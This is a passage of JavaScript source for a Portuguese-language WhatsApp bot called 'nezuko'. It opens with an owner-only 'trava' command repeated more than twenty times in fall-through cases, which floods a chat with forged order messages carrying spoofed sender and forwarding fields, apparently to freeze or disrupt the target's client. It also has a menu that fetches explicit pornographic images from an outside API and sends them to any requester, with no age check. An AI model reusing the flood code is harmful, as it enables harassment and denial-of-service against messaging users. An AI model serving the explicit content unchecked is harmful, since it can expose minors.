sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true

}})

case 'trava':
if(!SoDono) return reply(enviar.msg.donosmt)
frase = '⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻'
nezuko.sendMessage(from, {text: "⏤͟͞𝑷𝑯 ꪶ꙳ ⃘⃤꙰*ꫂ 𝑩𝑶𝑻"}, {quoted: { 
"key": {
"fromMe": false,
"participant":"0@s.whatsapp.net",
"remoteJid": "@call"
},
"message": {
orderMessage: {
itemCount: 666,
status: 200,
thumbnail: null,
surface: 200,
message: frase, 
orderTitle: '',
sellerJid: '@call'
}}, 
contextInfo: {
"forwardingScore":999,
"isForwarded": true
},
sendEphemeral: true
}})
break


//========FIM DAS TRAVAS=============\\

//======================================\\

//======================================\\

case 'menu-hentai': case 'hentais': case 'menuhentai': {
sections = [
{title: "🇱 🇮 🇸 🇹 🇦   🇩 🇪   🇭 🇪 🇳 🇹 🇦 🇮 🇸 ",
rows: [
{title: "✰ۜۜ͜͡𝐌𝐀𝐒𝐓𝐔𝐑𝐁𝐀𝐓𝐈𝐎𝐍🔞", rowId: `${prefix}masturbation`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐉𝐀𝐇𝐘🔞", rowId: `${prefix}jahy`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐋𝐀𝐒𝐒𝐄𝐒🔞", rowId: `${prefix}glasses`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐀𝐍𝐆-𝐁𝐀𝐍𝐆🔞", rowId: `${prefix}gangbang`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐅𝐎𝐎𝐓🔞", rowId: `${prefix}foot`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐅𝐄𝐌𝐃𝐎𝐌🔞", rowId: `${prefix}femdom`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐔𝐌🔞", rowId: `${prefix}cum`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐄𝐑𝐎🔞", rowId: `${prefix}ero`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐔𝐂𝐊𝐎𝐋𝐃🔞", rowId: `${prefix}cuckold`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐁𝐋𝐎𝐖𝐉𝐎𝐁🔞", rowId: `${prefix}blowjob`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐁𝐃𝐒𝐌🔞", rowId: `${prefix}bdsm`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐇𝐄𝐆𝐀𝐎🔞", rowId: `${prefix}ahegao`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐅𝐄𝐌𝐃𝐎𝐌🔞", rowId: `${prefix}femdom`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐒𝐒🔞", rowId: `${prefix}ass`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎𝐑𝐆𝐘🔞", rowId: `${prefix}orgy`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐀𝐍𝐓𝐈𝐄𝐒🔞", rowId: `${prefix}panties`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐇𝐈𝐍𝐆𝐇𝐒🔞", rowId: `${prefix}thinghs`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐘𝐔𝐑𝐈-𝐏𝐎𝐑𝐍🔞", rowId: `${prefix}yuriporn`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐄𝐍𝐓𝐀𝐂𝐋𝐄𝐒🔞", rowId: `${prefix}tentacles`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐒𝐅𝐖-𝐍𝐄𝐊𝐎🔞", rowId: `${prefix}nsfwneko`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐔𝐒𝐒𝐘🔞", rowId: `${prefix}pussy`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐅𝐖-𝐍𝐄𝐊𝐎🔞", rowId: `${prefix}sfwneko`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐙𝐄𝐓𝐓𝐀𝐈𝐑𝐘𝐎𝐔𝐈𝐊𝐈🔞", rowId: `${prefix}zettairyouiki`, description: `${NomeDoBot}`}]
},
]
 
const listMessage2 = {
text: `Todos os hentais serão enviados\nno pv do usuário que solicitar.`,
  footer: `By: ${NomeDoBot}`,
  title: `ꪶ𝐌𝐄𝐍𝐔-𝐇𝐄𝐍𝐓𝐀𝐈𝐒ꫂ`,
  buttonText: "🧧𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🧧️",
  sections
}
nezuko.sendMessage(from, listMessage2, {quoted: dnselo})
}
break

case 'masturbation': // by @ieubielziinn
case 'jahy': // by @ieubielziinn
case 'glasses': // by @ieubielziinn
case 'gangbang': // by @ieubielziinn
case 'foot': // by @ieubielziinn
case 'femdom': // by @ieubielziinn
case 'cum': // by @ieubielziinn
case 'ero': // by @ieubielziinn
case 'cuckold': // by @ieubielziinn
case 'blowjob': // by @ieubielziinn
case 'bdsm': // by @ieubielziinn
case 'ahegao': // by @ieubielziinn
case 'ass': // by @ieubielziinn
case 'orgy': // by @ieubielziinn
case 'panties': // by @ieubielziinn
case 'thinghs': // by @ieubielziinn
case 'tentacles': // by @ieubielziinn
case 'pussy': // by @ieubielziinn
case 'sfwneko': // by @ieubielziinn
case 'zettairyouiki': // by @ieubielziinn
reply(`<❗️> Aguarde um pouco, realizando seu pedido! Caso seja em grupo, estou enviando no privado por segurança!`)
buttonss = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎𝐗𝐈𝐌𝐎-𝐇𝐄𝐍𝐓𝐀𝐈🔞'}, type: 1}]
buttonMessagse = {
image: {url: `https://www.nezsab-apis.xyz/nsfw/${command}?apikey=${keyapi}`},
caption: `▢ ⌁ *Olá ${pushname}*, aqui está o seu pedido!\n▢ ⌁ *Horário solicitado:* ${time}\n▢ ⌁ Deseja mais hentai _*${command}*_? Clique no botão abaixo:`,
footer: `By: ${NomeDoBot}`,
buttons: buttonss,
headerType: 4
}
nezuko.sendMessage(sender, buttonMessagse, {quoted: dnselo})
break

case 'nsfwneko': // by @ieubielziinn
reply(`<❗️> Aguarde um pouco, realizando seu pedido! Caso seja em grupo, estou enviando no privado por segurança!`)
buttonss = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎𝐗𝐈𝐌𝐎-𝐇𝐄𝐍𝐓𝐀𝐈🔞'}, type: 1}]
buttonMessagse = {
image: {url: `https://www.nezsab-apis.xyz/nsfw/neko?apikey=${keyapi}`},
caption: `▢ ⌁ *Olá ${pushname}*, aqui está o seu pedido!\n▢ ⌁ *Horário solicitado:* ${time}\n▢ ⌁ Deseja mais hentai _*${command}*_? Clique no botão abaixo:`,
footer: `By: ${NomeDoBot}`,
buttons: buttonss,
headerType: 4
}
nezuko.sendMessage(sender, buttonMessagse, {quoted: dnselo})
break

case 'yuri': // by @ieubielziinn
reply(`<❗️> Aguarde um pouco, realizando seu pedido! Caso seja em grupo, estou enviando no privado por segurança!`)
buttonss = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎𝐗𝐈𝐌𝐎-𝐇𝐄𝐍𝐓𝐀𝐈🔞'}, type: 1}]
buttonMessagse = {
image: {url: `https://www.nezsab-apis.xyz/nsfw/${command}?apikey=${keyapi}`},
caption: `▢ ⌁ *Olá ${pushname}*, aqui está o seu pedido!\n▢ ⌁ *Horário solicitado:* ${time}\n\nDeseja mais hentai de *${command}*? _Clique no botão abaixo e aguarde!_`,
footer: `By: ${NomeDoBot}`,
buttons: buttonss,
headerType: 4
}
nezuko.sendMessage(sender, buttonMessagse, {quoted: dnselo})
break

case 'covidbr':
teks = args.join(' ')
covidnb = await fetchJson(`https://nezsab-apis.xyz/api/covidmundo?apikey=${keyapi}`)
anu = `ೋ❀ *💉𝐂𝐎𝐕𝐈𝐃-𝟏𝟗 𝐁𝐑🇧🇷* ❀ೋ
ೋ❀ 𝘊𝘢𝘴𝘰𝘴 𝘯𝘰 𝘉𝘳𝘢𝘴𝘪𝘭⧽ ${covidnb.casos}
ೋ❀ 𝘊𝘢𝘴𝘰𝘴 𝘩𝘰𝘫𝘦⧽ ${covidnb.casos_hoje}
ೋ❀ 𝘛𝘰𝘵𝘢𝘭 𝘥𝘦 𝘔𝘰𝘳𝘵𝘦𝘴⧽ ${covidnb.mortes}
ೋ❀ 𝘔𝘰𝘳𝘵𝘦𝘴 𝘩𝘰𝘫𝘦⧽ ${covidnb.mortes_hojes}
ೋ❀ 𝘙𝘦𝘤𝘶𝘱𝘦𝘳𝘢𝘥𝘰𝘴⧽ ${covidnb.recuperadosPorMilhao}
ೋ❀ 𝘊𝘢𝘴𝘰𝘴 𝘢𝘵𝘪𝘷𝘰𝘴⧽ ${covidnb.active}
ೋ❀ 𝘊𝘢𝘴𝘰𝘴 𝘤𝘳𝘪𝘵𝘪𝘤𝘰𝘴⧽ ${covidnb.criticos}
ೋ❀ 𝘛𝘦𝘴𝘵𝘦𝘴 𝘵𝘰𝘵𝘢𝘪𝘴⧽ ${covidnb.testes}`
nezuko.sendMessage(from, {text: anu}, {quoted: dnselo})
break

case 'covid2':  //BY: Nakatuny Akv
      if (args.length < 1) return env('Insira o código, exemplo.\n#covid RJ')
					Ingrida = await fetchJson(`https://covid19-brazil-api.now.sh/api/report/v1/brazil/uf/${args[0]}`, {method: 'get'})
                     tristan = `✅Selecionado: ${Ingrida.state}\n\n🗣️Pedido: ${Ingrida.uf}\n\n🦠Infectados: ${Ingrida.cases}\n\n☠️Mortes: ${Ingrida.deaths}\n\n👥Não confirmado: ${Ingrida.suspects}\n\n📅Data de atualização: ${Ingrida.datetime}️️`                     
				reply(tristan)
                    break

case 'covidmundo':
    bla = await fetchJson(`https://nezsab-apis.xyz/api/covidmundo?apikey=${keyapi}`) 
bla = bla.resultado
pla = `ೋ❀ *💉𝐂𝐎𝐕𝐈𝐃-𝟏𝟗 𝐌𝐔𝐍𝐃𝐎🌎* ❀ೋ\n`
pla += `ೋ❀ 𝘗𝘢𝘪́𝘴𝘦𝘴 𝘈𝘧𝘦𝘵𝘢𝘥𝘰𝘴⧽ ${bla.paisesAfetados}\n`
pla += `ೋ❀ 𝘛𝘰𝘵𝘢𝘭 𝘥𝘦 𝘊𝘢𝘴𝘰𝘴⧽ ${bla.casos}\n`
pla += `ೋ❀ 𝘊𝘢𝘴𝘰𝘴 𝘩𝘰𝘫𝘦⧽ ${bla.casos_hoje}\n`
pla += `️ೋ❀ 𝘛𝘰𝘵𝘢𝘭 𝘥𝘦 𝘖́𝘣𝘪𝘵𝘰𝘴⧽ ${bla.mortes}\n`
pla += `ೋ❀ 𝘖́𝘣𝘪𝘵𝘰𝘴 𝘩𝘰𝘫𝘦⧽ ${bla.mortes_hojes}\n`
pla += `ೋ❀ 𝘛𝘰𝘵𝘢𝘭 𝘥𝘦 𝘙𝘦𝘤𝘶𝘱𝘦𝘳𝘢𝘥𝘰𝘴⧽ ${bla.recuperados}\n`
pla += `ೋ❀ 𝘙𝘦𝘤𝘶𝘱𝘦𝘳𝘢𝘥𝘰𝘴 𝘩𝘰𝘫𝘦⧽ ${bla.recuperados_hoje}\n`
pla += `ೋ❀ 𝘗𝘰𝘱𝘶𝘭𝘢𝘤̧𝘢̃𝘰 𝘛𝘰𝘵𝘢𝘭⧽ ${bla.população}\n`
nezuko.sendMessage(from, {text: pla}, {quoted: dnselo})
break

case 'buscaimg':
case 'buscarimg':
if (!q) return reply(`❎ Que imagem você quer que eu pesquise? `);
reply(mess.wait)
let pin = await hx.pinterest(q);
let ac = pin[Math.floor(Math.random() * pin.length)];
let di = await getBuffer(ac);
imgg = 'Pronto'
nezuko.sendMessage(from, {image: di, caption: imgg},{quoted: dnselo})
break

case 'block-tmp':
if(!SoDono) return reply(enviar.msg.donosmt)
if(!args[0])return reply("informe o numero do usuario")
if(!info.message.extendedTextMessage)return reply("mencione no @ ")
bv = info.message.extendedTextMessage.contextInfo.mentionedJid[0]
if(getadvBlock2(from) && getadvBlock2(from).map(i => i.userId).includes(bv))return reply('Este usuario já está bloqueado')
if(!args[1])return reply("Informe o tempo\nex: 31d = 31 dias")
addadv2(from, {userId: bv, expired: toMs(args[1])+Date.now()})
reply(`O usuario ${bv.split("@")[0]} Foi bloqueado temporariamente`)
break

case'unblock-tmp':

if(!SoDono) return reply(enviar.msg.donosmt)

bv = info.message.extendedTextMessage.contextInfo.mentionedJid[0]

if(!getadvBlock2(from).map(i => i.userId).includes(bv))return reply('Este usuario não está bloqueado')

deleteadv2(from, bv)

reply(`O usuario ${bv.split("@")[0]} Foi desbloqueado`)

break

case 'listablock-tmp':
tkks = '╭─*「 *Usuarios BLOQUEADOS* 」\n'
for (let V of getadvBlock2(from).map(i => i.userId)) {
tkks += `│+  ${V}\n`
}
tkks += `│+ Total : ${getadvBlock2(from).map(i => i.userId).length}\n╰──────*「 *𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿* 」*────`
await nezuko.sendMessage(from, {text: tkks.trim()}, {quoted: dnselo})
break

case 'unblock-tmp2':
if(!SoDono) return reply(enviar.msg.donosmt)
bv = args[0] + "@s.whatsapp.net"
if(!getadvBlock2(from).map(i => i.userId).includes(bv))return reply('Este usuario não está bloqueado')
deleteadv2(from, bv)
reply(`O usuario ${bv.split("@")[0]} Foi desbloqueado`)
break

case 'criartabela': case 'criartbl': case 'criartab':
if(!isGroupAdmins && !SoDono) return reply("Só adm ou dono pode utilizar este comando.")
msgz = args.join(" ")

msgtmpol = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

datinhaofc = moment.tz('America/Sao_Paulo').format('DD/MM/YY');

var blarpty = {
Horario: msgtmpol, 
Data: datinhaofc, 
Tabela: msgz
}

if(!fs.existsSync(`./func/tabela/tabela-${from}.json`)) {
fs.writeFileSync(`./func/tabela/tabela-${from}.json`,
JSON.stringify(blarpty, null, 2));
} else {
if (fs.existsSync("./func/tabela/tabela-" + from + ".json")) {
fs.unlinkSync("./func/tabela/tabela-" + from + ".json");
fs.writeFileSync(`./func/tabela/tabela-${from}.json`,
JSON.stringify(blarpty, null, 2));
}
}
reply(`Tabela do grupo foi criada com sucesso..`)
break

case 'tabelagp': case 'tabeladogp': case 'tabelinha': 
if(!fs.existsSync(`./func/tabela/tabela-${from}.json`)) {
reply(`Cade a tabela, cria ela com o comando\nExemplo : ${prefix}criartabela cuzinho dotoso: e etc ..`)
}
const tabelagpofc = JSON.parse(fs.readFileSync(`./func/tabela/tabela-${from}.json`)); 

